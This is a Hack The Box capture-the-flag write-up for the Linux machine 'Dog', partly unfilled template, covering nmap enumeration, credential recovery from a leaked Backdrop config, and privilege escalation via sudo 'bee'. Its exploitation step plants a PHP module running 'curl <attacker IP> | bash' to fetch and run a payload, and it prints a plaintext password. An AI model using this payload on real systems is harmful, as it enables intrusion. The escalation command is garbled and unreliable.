### Hack The Box Writeup: Dog

## Overview

- **Machine Name**: Dog
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: July 2025

## Tools Used

- **Enumeration**: \[e.g., Nmap, Gobuster\]
- **Exploitation**: \[e.g., Metasploit, Custom Python scripts\]
- **Privilege Escalation**: \[e.g., LinPEAS, Windows Exploit Suggester\]
- **Other**: \[e.g., Burp Suite, Wireshark\]

## Methodology

### Initial Enumeration


```bash
ping -c 1 10.10.11.58

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn -oG allPorts 10.10.11.58
nmap -sCV -p22,80 10.10.11.58 -oN targeted

whatweb http://10.10.11.58:80

# ans
http://10.10.11.58:80 [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.58], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]

nmap --script http-enum -p80 10.10.11.58 -oN webScan

# recompose project with git-hack

tiffany@dog.htb
pass: # view file sttings.php


```

### Exploitation

```bash
# we need to download backdrop modules examples and delete page_example.module and replace it with our own module

<>
<?php
  system("curl 10.10.16.58 | bash");
?>

# After that, we need to compress all files
tar -zcvf page_example.tar.gz page_example/

BackDropJ2024DS2024

```

### Privilege Escalation

```bash

script /dev/null -c bash
sctrl + z
stty raw -echo; fg

reset xterm
export TERM=xterm
export SHELL=bash

su johncusack

BackDropJ2024DS2024

sudo -l

# ans
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

sudo bee --root=/var/www/html sh');"system('chmod u+s /bin');" 

```

## Challenges Faced


## Lessons Learned


## References


---

*Written by YourName, July 2025. Feedback welcome at https://github.com/edibauer*